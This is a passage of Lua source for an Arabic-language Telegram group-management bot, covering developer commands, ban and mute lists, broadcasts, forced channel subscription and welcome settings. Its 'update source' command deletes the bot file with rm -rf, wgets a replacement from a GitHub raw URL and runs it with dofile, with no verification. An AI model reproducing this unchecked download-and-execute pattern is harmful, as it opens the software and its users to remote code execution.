local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmod:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == "تحديث السورس ☉" or text == 'تحديث السورس' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
os.execute('rm -rf Black.lua')
os.execute('rm -rf getfile.json')
os.execute('wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/Black.lua')
send(msg.chat_id_, msg.id_,' ⋄تم تحديث السورس \n⋄تم اعاده تشغيل البوت\n⋄الاصدار »> `3.5`') 
dofile('Black.lua')
end
if text == "ضع اسم للبوت ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ⋄ارسل اليه الاسم الان ")
return false
end
if text == 'المشتركين ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n⋄المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'الجروبات ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n⋄الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("مسح المطورين الثالثين ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Sudo:bot3')
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المطورين الثالثين ")
end
if text == ("المطورين الثالثين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Sudo:bot3')
t = "\n⋄قائمة المطورين \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الحظر العام ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه الحظر العام')
return false
end
if text == ("قائمه الحظر العام ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'GBan:User')
t = "\n⋄قائمه المحظورين عام \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("مسح العام ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'GBan:User')
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه (الكتم-الحظر) العام')
return false
end
if text == ("مسح الكتم العام ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه الكتم العام')
return false
end
if text == ("قائمه الكتم العام ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Gmute:User')
t = "\n⋄قائمة المكتومين عام \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص ☉" and msg.reply_to_message_id_ == 0 then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل الان اذاعتك؟ \n⋄للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ☉" and msg.reply_to_message_id_ == 0 then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل الان اذاعتك؟ \n⋄للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ☉" and msg.reply_to_message_id_ == 0 then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل الان اذاعتك؟ \n⋄للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل لي التوجيه الان")
return false
end 
if text == 'جلب المشتركين ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
GetUsersBot(msg)
end
if text == 'جلب الجروبات ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
GetGroupsBot(msg)
end
if text == "مسح المشتركين" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'⋄لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'⋄عدد المشتركين الان »> ( '..#pv..' )\n⋄تم ازالة »> ( '..sendok..' ) من المشتركين\n⋄الان عدد المشتركين الحقيقي »> ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "مسح الجروبات ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'⋄لا يوجد جروبات وهميه في البوت\n')   
else
local Black = (w + q)
local sendok = #group - Black
if q == 0 then
Black = ''
else
Black = '\n⋄تم ازالة »> { '..q..' } جروبات من البوت'
end
if w == 0 then
Blackk = ''
else
Blackk = '\n⋄تم ازالة »> {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'⋄عدد الجروبات الان »> { '..#group..' }'..Blackk..''..Black..'\n⋄الان عدد الجروبات الحقيقي »> { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
return false
end
if text and text:match("^رفع مطور ثالث @(.*)$") and SudoBot2(msg) then
local username = text:match("^رفع مطور ثالث @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Sudo:bot3', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مطور ثالث'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور ثالث (%d+)$") and SudoBot2(msg) then
local userid = text:match("^رفع مطور ثالث (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Sudo:bot3', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور ثالث @(.*)$") and SudoBot2(msg) then
local username = text:match("^تنزيل مطور ثالث @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Sudo:bot3', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله مطور ثالث'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور ثالث (%d+)$") and SudoBot2(msg) then
local userid = text:match("^تنزيل مطور ثالث (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Sudo:bot3', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text and not Special(msg) then  
local Black1_Msg = database:get(bot_id.."Black1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Black1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄العضو »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄'..Black1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ⋄تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ⋄تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ⋄تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ⋄تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ⋄تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ⋄تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, ' ⋄المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' ⋄عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' ⋄عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' ⋄البوت ادمن في القناة \n⋄تم تفعيل الاشتراك الاجباري في \n⋄ايدي القناة ('..data.id_..')\n⋄معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username',data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' ⋄عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text:match("^الغاء ☉$") then 
send(msg.chat_id_, msg.id_, " ⋄تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' ⋄تم تغيير رسالة الاشتراك ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,' ⋄عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,' ⋄… عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' ⋄تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ⋄تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' ⋄تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ⋄تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' ⋄تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," ⋄تم الغاء حفظ الرابط")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_," ⋄تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if Black_Msg and not Special(msg) then  
